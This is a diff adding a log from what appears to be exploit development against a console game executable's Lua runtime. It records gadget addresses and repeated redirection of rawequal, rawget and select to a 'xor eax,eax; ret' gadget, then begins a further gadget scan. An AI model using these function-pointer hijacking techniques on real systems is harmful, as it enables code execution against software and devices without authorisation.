@@ -1,0 +1,50 @@
+=== PROBE 56e: CLEAN GADGET EXECUTION ===
+
+[INFO] Addresses:
+  rawequal:   0x00000003_10883820
+  rawget:     0x00000003_108838A0
+  select:     0x00000003_10883440
+  eboot base: 0x00000000_45BE0000
+  xor eax,eax;ret: 0x00000000_45BE0471
+  gadget bytes: 0x8BC3C031 (expect 0x??C3C031)
+  CONFIRMED: 31 C0 C3 = xor eax,eax; ret
+
+[A] Redirect rawequal -> xor eax,eax;ret
+  Baseline rawequal(1,1) = true
+  MARKER_A_BEFORE_WRITE
+  MARKER_A_AFTER_WRITE
+  MARKER_A_AFTER_CALL
+  pcall ok=true r1=nil r2=nil
+  direct call result: nil
+  MARKER_A_RESTORED
+  verify rawequal(1,1) = true
+
+[B] 10 redirect+call+restore cycles (xor eax,eax;ret)
+  cycle 1: ok=true r1=nil
+  cycle 2: ok=true r1=nil
+  cycle 3: ok=true r1=nil
+  cycle 4: ok=true r1=nil
+  cycle 5: ok=true r1=nil
+  cycle 6: ok=true r1=nil
+  cycle 7: ok=true r1=nil
+  cycle 8: ok=true r1=nil
+  cycle 9: ok=true r1=nil
+  cycle 10: ok=true r1=nil
+  verify rawequal(1,1) = true
+
+[C] Redirect rawget -> xor eax,eax;ret
+  Baseline rawget({x=1},'x') = 1
+  pcall ok=true r1=nil
+  direct: nil
+  verify rawget({x=1},'x') = 1
+
+[D] Redirect select -> xor eax,eax;ret
+  Baseline select(1,'a','b') = a
+  pcall ok=true r1=nil
+  verify select(1,'a','b') = a
+
+[E] Timing: 100 redirect+call+restore cycles
+  100 cycles: 0.0065s (0.000065s each)
+  verify rawequal(1,1) = true
+
+[F] Scanning eboot for mov eax,1;ret (B8 01000000 C3)
